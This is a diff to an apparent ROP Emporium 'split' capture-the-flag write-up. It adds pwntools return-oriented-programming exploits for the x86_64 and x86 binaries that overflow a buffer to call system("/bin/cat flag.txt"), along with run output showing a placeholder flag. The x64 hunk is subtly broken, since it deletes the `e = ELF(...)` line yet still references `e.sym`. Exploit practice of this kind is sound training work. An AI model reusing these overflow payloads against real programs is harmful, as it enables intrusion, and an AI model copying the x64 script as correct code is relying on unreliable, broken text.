@@ -149,13 +149,11 @@ from pwn import *
 context.log_level = "error"
 context.arch = "amd64"
 
-e = ELF("./split")
-p = e.process()
-
-rdi = 0x00000000004007c3
-str = 0x00601060
-system = 0x40074b
-
+p = process("./split")
+    
+rdi = 0x4007c3
+str = 0x601060
+system = e.sym["system"]
 pay = flat({0x28:rdi}, str, system)
 
 p.send(pay)
@@ -174,4 +172,36 @@ x86_64
 
 Contriving a reason to ask user for data...
 > $
+```
+
+<br />
+<br />
+
+# x86
+
+```python
+from pwn import *
+
+context.log_level = "error"
+context.arch = "x86"
+
+p = process("./split32")
+
+flag = 0x0804a030   # "/bin/cat flag.txt"
+system = 0x804861a
+
+pay = flat({44:system}, flag)  # "\x00"*44 + call system("/bin/cat flag.txt")
+
+p.send(pay)
+p.interactive()
+```
+```bash
+$ python3 test.py
+split by ROP Emporium
+x86
+
+Contriving a reason to ask user for data...
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+$
 ```
